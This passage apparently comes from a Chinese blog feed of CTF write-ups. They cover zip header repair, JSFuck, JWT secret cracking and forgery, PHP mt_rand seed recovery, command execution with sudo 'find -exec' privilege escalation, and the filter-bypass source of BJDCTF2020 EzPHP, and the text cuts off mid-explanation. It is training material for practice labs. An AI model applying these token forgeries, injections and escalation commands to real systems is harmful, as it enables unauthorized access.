class="hljs-number">46</span>：最后修改文件日期<br><span class="hljs-number">16</span> B5 <span class="hljs-number">80</span> <span class="hljs-number">14</span>：CRC-<span class="hljs-number">32</span>校验（<span class="hljs-number">1480B516</span>）<br><span class="hljs-number">19</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：压缩后尺寸（<span class="hljs-number">25</span>）<br><span class="hljs-number">17</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：未压缩尺寸（<span class="hljs-number">23</span>）<br><span class="hljs-number">07</span> <span class="hljs-number">00</span>：文件名长度<br><span class="hljs-number">24</span> <span class="hljs-number">00</span>：扩展字段长度<br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：文件注释长度<br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：磁盘开始号<br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：内部文件属性<br><span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：外部文件属性<br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：局部头部偏移量<br> <br>压缩源文件目录结束标志：<br><span class="hljs-number">50</span> 4B <span class="hljs-number">05</span> <span class="hljs-number">06</span>：目录结束标记<br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：当前磁盘编号<br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：目录区开始磁盘编号<br><span class="hljs-number">01</span> <span class="hljs-number">00</span>：本磁盘上纪录总数<br><span class="hljs-number">01</span> <span class="hljs-number">00</span>：目录区中纪录总数<br><span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：目录区尺寸大小<br>3E <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>：目录区对第一张磁盘的偏移量<br><span class="hljs-number">00</span> <span class="hljs-number">00</span>：ZIP 文件注释长度<br></code></pre></td></tr></table></figure><p>一开始还以为与压缩分卷有关，后来放到010Editor里面分析，发现：</p><img src="https://s2.loli.net/2022/11/25/xWwth25ZcLgRlN9.png" alt="image-20221111225527606" style="zoom: 50%;" /><p>出现了zip文件的目录区和目录结束区，但是没有数据区。</p><p>观察文件开头，发现：</p><p><img src="https://s2.loli.net/2022/11/25/KHJ1b4F2TRODIZq.png" alt="image-20221111225833129"></p><p>此处好像缺少 50 4B 03 04</p><p>于是加上，可得：</p><img src="https://s2.loli.net/2022/11/25/UDvxb27GZtuAHr8.png" alt="image-20221111230009619" style="zoom:33%;" /><p>保存该zip文件，打开可得：</p><p><img src="https://s2.loli.net/2022/11/25/95QlbKcqsfYSELw.png" alt="image-20221111230052181"></p><p>里面是这样的：</p><p><img src="https://s2.loli.net/2022/11/25/6EtowYs1xlRqJ98.png" alt="image-20221111230113289"></p><p>经过查询结合题目得知：</p><p>这是一个JSFuck加密</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">JSFuck 是使用 <span class="hljs-selector-attr">[ 、]</span> 、( 、) 、! 和 + 六种字符来表示原有的字符的<br></code></pre></td></tr></table></figure><p>解密可得flag：</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">This<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>JSFUCK<br></code></pre></td></tr></table></figure><h2 id="2、WEB"><a href="#2、WEB" class="headerlink" title="2、WEB"></a>2、WEB</h2><h3 id="2-1-Python-Master"><a href="#2-1-Python-Master" class="headerlink" title="2.1 Python Master"></a>2.1 Python Master</h3><p>打开发现：</p><img src="https://s2.loli.net/2022/11/25/LhHgSVEcqnpQRfN.png" alt="image-20221111230559290" style="zoom:25%;" /><p>刷新后：</p><img src="https://s2.loli.net/2022/11/25/SiYhD3yRTpGBF7g.png" alt="image-20221111230614867" style="zoom:25%;" /><p>于是使用bp抓包：</p><p><img src="https://s2.loli.net/2022/11/25/Y1E9F8sUJncOVmD.png" alt="image-20221111230746624"></p><p>在Cookie中发现一串可疑的编码，经过查询可知，该编码为jwt编码</p><p>JWT结构：</p><p>JWT 的三个组成部分依次如下。</p><ul><li>· Header（头部）</li><li>· Payload（负载）</li><li>· Signature（签名）</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 写成一行，就是下面的样子</span><br><span class="hljs-attribute">Header</span>.Payload.Signature<br></code></pre></td></tr></table></figure><h4 id="2-1-1-Header"><a href="#2-1-1-Header" class="headerlink" title="2.1.1 Header"></a>2.1.1 Header</h4><p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>上面代码中，alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT。</p><p>最后，将上面的 JSON 对象使用 Base64URL 算法转成字符串。</p><h4 id="2-2-2-Payload"><a href="#2-2-2-Payload" class="headerlink" title="2.2.2 Payload"></a>2.2.2 Payload</h4><p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p><ul><li>iss (issuer)：签发人</li><li>exp (expiration time)：过期时间</li><li>sub (subject)：主题</li><li>aud (audience)：受众</li><li>nbf (Not Before)：生效时间</li><li>iat (Issued At)：签发时间</li><li>jti (JWT ID)：编号</li></ul><p>除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1234567890&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;John Doe&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。</p><p>这个 JSON 对象也要使用 Base64URL 算法转成字符串。</p><h4 id="2-2-3-Signature"><a href="#2-2-3-Signature" class="headerlink" title="2.2.3 Signature"></a>2.2.3 Signature</h4><p>Signature 部分是对前两部分的签名，防止数据篡改。</p><p>首先，<strong>需要指定一个密钥（secret）</strong>。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">HMACSHA256(<br>  <span class="hljs-name">base64UrlEncode</span>(<span class="hljs-name">header</span>) + <span class="hljs-string">&quot;.&quot;</span> +<br>  base64UrlEncode(<span class="hljs-name">payload</span>),<br>  secret)<br></code></pre></td></tr></table></figure><p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。</p><p>我们将cookie中的JWT编码放到 <a href="https://jwt.io/">JSON Web Tokens - jwt.io</a> 网站中解密，发现：</p><img src="https://s2.loli.net/2022/11/25/JL1V2Bet87o4mFv.png" alt="image-20221111231437393" style="zoom:33%;" /><p>此处我们将 payload中的 guest 改成 admin即可，但是我们不知道密钥就不能知道JWT编码的第三段。</p><p>经过查询可知，有个插件  c-jwt-cracker-master 可以破解密钥，安装在kali里面</p><p><img src="https://s2.loli.net/2022/11/25/6P4nQtUIkMuifZl.png" alt="image-20221111232631951"></p><p>格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./jwtcrack jwt编码<br></code></pre></td></tr></table></figure><p>解码可得密钥：1KuN</p><img src="https://s2.loli.net/2022/11/25/lhvujrqPNAX3YMi.png" alt="image-20221111232752211" style="zoom:33%;" /><p>通过密钥就可以获得JWT编码，发送数据包就得到了源码。。。</p><h3 id="2-2-非诚勿扰"><a href="#2-2-非诚勿扰" class="headerlink" title="2.2 非诚勿扰"></a>2.2 非诚勿扰</h3><p>进入题目后，查看robots.txt可得到 一个源码，其中mt_srand(???) 参数用？说明不知道参数是多少 </p><p><img src="https://s2.loli.net/2022/11/25/2VhtJcgy5OivKop.png" alt="image-20221111233024823"></p><h4 id="2-2-1-mt-srand"><a href="#2-2-1-mt-srand" class="headerlink" title="2.2.1 mt_srand()"></a>2.2.1 <strong>mt_srand()</strong></h4><p>mt_srand() 播种 Mersenne Twister 随机数生成器。</p><h5 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mt_srand</span><span class="hljs-params">(seed)</span></span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">seed</td><td align="left">必需。用 seed 来给随机数发生器播种。</td></tr></tbody></table><h5 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h5><p>从 PHP 4.2.0 版开始，<em>seed</em> 参数变为可选项，当该项为空时，会被设为随时数。</p><h4 id="2-2-2-mt-rand"><a href="#2-2-2-mt-rand" class="headerlink" title="2.2.2 mt_rand()"></a>2.2.2 mt_rand()</h4><p>mt_rand() 使用 Mersenne Twister 算法返回随机整数。</p><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">mt<span class="hljs-constructor">_rand(<span class="hljs-params">min</span>,<span class="hljs-params">max</span>)</span><br></code></pre></td></tr></table></figure><h3 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h3><p>如果没有提供可选参数 <em>min</em> 和 <em>max</em>，mt_rand() 返回 0 到 RAND_MAX 之间的<strong>伪随机数</strong>。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p><p>经过查询资料可知，如果mt_srand()参数为一个常数，那么mt_rand()产生的就是伪随机数，每次运行产生的随机数与上一次值和位置完全相同。</p><p>由此可知：本题只要把mt_srand(seed) 中的seed求出来，即可得到答案</p><p>查看代码可知：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">mt_srand</span>(???);<br><span class="hljs-variable">$str_long1</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$len1</span>=<span class="hljs-number">20</span>;<br><span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$len1</span>; <span class="hljs-variable">$i</span>++ )&#123;<br>    <span class="hljs-variable">$str</span>.=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str_long1</span>, <span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str_long1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);       <br>&#125;<br><span class="hljs-variable">$godess_id</span> = <span class="hljs-variable">$str</span>;<br></code></pre></td></tr></table></figure><p>结合所给hint，第一次产生的伪随机数：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jvFwBRdQoTmEH6Pgj1gk </span><br></code></pre></td></tr></table></figure><p>根据该串随机数结合源码中 $str_long1 可得到随机数出现的数字位置的一串编码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><p>然后使用该编码 在 kali 中安装插件 php_mt_seed  使用特定格式即可爆出seed</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">./php_mt_seed<span class="hljs-number"> 9 </span>9<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 21 </span>21<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 31 </span>31<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 22 </span>22<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 27 </span>27<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 43 </span>43<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 3 </span>3<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 42 </span>42<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 14 </span>14<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 45 </span>45<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 12 </span>12<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 30 </span>30<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 33 </span>33<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 58 </span>58<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 41 </span>41<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 6 </span>6<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 9 </span>9<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 53 </span>53<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 6 </span>6<span class="hljs-number"> 0 </span>61<span class="hljs-number"> 10 </span>10<span class="hljs-number"> 0 </span>61<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/11/25/Uu7KmplqLyH21kv.png" alt="image-20221112000142380"></p><p>seed：1314521 （注意php版本号）</p><p>然后写代码，在第521次出现的地方就是那个编号，提交即可拿flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fxz靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>findme</title>
    <link href="/2023/08/24/findme/"/>
    <url>/2023/08/24/findme/</url>
    
    <content type="html"><![CDATA[<h3 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h3><p>我们访问网站发现如下提示：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">Please POST <span class="hljs-string">&#x27;shit&#x27;</span> <span class="hljs-keyword">to</span> /cmd<br></code></pre></td></tr></table></figure><p>提示我们需要post请求提交参数，访问 <code>/cmd</code> 目录</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304012124518.png" alt="image-20230401212433415" style="zoom: 33%;" /><p>提示在环境变量中没有发现ls命令，于是我们使用绝对路径：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304012126403.png" alt="image-20230401212627339" style="zoom:50%;" /><p>查看到了flag在根目录下面，于是我们使用 :</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">shit</span><span class="hljs-operator">=/</span>bin/cat flag<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304012128020.png" alt="image-20230401212818951" style="zoom: 33%;" /><p>提示我们没有权限，于是我们使用命令：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">shit</span><span class="hljs-operator">=/</span>usr/bin/sudo -l<br></code></pre></td></tr></table></figure><p><code>sudo -l</code> 会显示出<code>sudo使用者</code>的权限</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304012131905.png" alt="image-20230401213116794"></p><p>提示当前用户：<code>ctf</code> 在 <code>/usr/bin/find</code> 使用<code>sudo</code>可以不需要密码(<code>NOPASSWD</code>) </p><p><a href="https://knightyun.github.io/2019/06/20/sudo-nopasswd">linux中sudo免密码</a></p><p>我们查看一下根目录下 <code>start.sh</code> 内容：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">shit</span><span class="hljs-operator">=/</span>bin/cat start.sh<br></code></pre></td></tr></table></figure><p>start.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><br><br>useradd ctf<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ctf ALL=(root) NOPASSWD: /usr/bin/find&quot;</span> &gt; /etc/sudoers.d/ctf &amp;&amp; <span class="hljs-built_in">chmod</span> 0440 /etc/sudoers.d/ctf  <span class="hljs-comment"># 此处给个findNOPASSWD，并修改权限</span><br><br>su - ctf -c <span class="hljs-string">&quot;/main&quot;</span><br></code></pre></td></tr></table></figure><p>根据以上分析，我们需要知道<code>find命令</code>还可以<code>命令执行</code>：</p><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find flag -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> f* \;   <span class="hljs-comment"># 在bash环境下有特殊意义，因此利用反斜杠来转义</span><br></code></pre></td></tr></table></figure><p>在当前目录下找到flag文件，并且执行命令：<code>cat f*</code>，</p><p><strong>-exec和 ;之间就是find后的额外命令</strong></p><p>因此，我们可以使用sudo提权find，查看flag文件内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">shit=/usr/bin/sudo find /flag -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> flag \;<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304012144631.png" alt="image-20230401214440555" style="zoom: 33%;" />]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>findme</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EzPHP</title>
    <link href="/2023/08/24/EzPHP/"/>
    <url>/2023/08/24/EzPHP/</url>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p><img src="https://s2.loli.net/2023/03/13/3H5UJlWQLYMusoE.png" alt="image-20230313173344604"></p><p>js被禁用了，我们按F12看源码，发现base32编码，</p><p>解密得：<code>1nD3x.php</code></p><p>于是我们访问：<code>/1nD3x.php</code> 得到题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;1nD3x.php&quot;</span>;<br><span class="hljs-variable">$shana</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shana&#x27;</span>];<br><span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br><span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])<br>        )  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You seem to want to do something bad?&#x27;</span>); <br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123; <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br>&#125; <br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>) !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$shana</span>) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || <br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) ) &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); <br>&#125; <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>分析一下，有几个需要绕过的地方：</p><h4 id="一：绕过-SERVER-QUERY-STRING"><a href="#一：绕过-SERVER-QUERY-STRING" class="headerlink" title="一：绕过 $_SERVER[&#39;QUERY_STRING&#39;]"></a>一：绕过 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])<br>        )  <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You seem to want to do something bad?&#x27;</span>); <br>&#125; <br></code></pre></td></tr></table></figure><p>首先我们需要知道 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 是什么，直白地说是：查询字符串</p><p>其实就是URL中?后面的东西，</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">localhost?a=<span class="hljs-number">12</span>&amp;b=<span class="hljs-number">34</span><br><br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>] =&gt;   a=<span class="hljs-number">12</span>&amp;b=<span class="hljs-number">34</span><br></code></pre></td></tr></table></figure><p>这里需要绕过它，看似不可能，其实很简单</p><p>我们只需<code>将url中的参数全部使用url编码即可绕过</code> ，</p><blockquote><p>因为<code>$_SERVER[&#39;QUERY_STRING&#39;]</code> <code>不会将参数自动进行url解码</code>，</p><p>但是 